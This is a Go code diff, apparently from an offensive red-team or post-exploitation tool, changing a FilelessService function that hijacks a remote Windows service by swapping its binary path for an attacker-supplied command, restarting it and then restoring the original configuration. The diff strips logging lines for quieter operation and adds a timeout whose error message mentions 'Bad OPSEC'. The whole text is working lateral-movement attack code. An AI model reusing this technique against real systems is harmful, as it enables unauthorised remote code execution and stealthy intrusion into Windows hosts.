@@ -6,7 +6,6 @@ package services
 import (
 	"errors"
 	"fmt"
-	"log"
 	"time"
 
 	"golang.org/x/sys/windows/svc"
@@ -26,7 +25,6 @@ func FilelessService(args []string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	log.Println("Connected to remote service")
 	defer serviceMgr.Disconnect()
 	s, err := serviceMgr.OpenService(serviceName)
 	if err != nil {
@@ -37,20 +35,26 @@ func FilelessService(args []string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	log.Println("opened service")
 	oldBinPath := c.BinaryPathName
 	c.BinaryPathName = serviceBinary
 	err = s.UpdateConfig(c)
 	if err != nil {
 		return "", err
 	}
-	log.Println("Updated config")
 	s.Control(svc.Stop)
-	log.Println("stopped service")
+	c1 := make(chan string, 1)
 	time.Sleep(time.Second * 5)
-	s.Start()
+	go func() {
+		s.Start()
+		c1 <- "done"
+	}()
+	select {
+	case <-c1:
+		break
+	case <-time.After(30 * time.Second):
+		return "", errors.New("[+] Your command might have executed but the service is now hung. Bad OPSEC")
+	}
 	time.Sleep(time.Second * 5)
-	log.Println("started service")
 	c, err = s.Config()
 	if err != nil {
 		return "", err
@@ -60,8 +64,7 @@ func FilelessService(args []string) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	log.Println("checking config")
-	return fmt.Sprintf("Should Have Worked"), nil
+	return fmt.Sprintf("[+] Should Have Worked"), nil
 }
 
 func DeleteService(args []string) (string, error) {
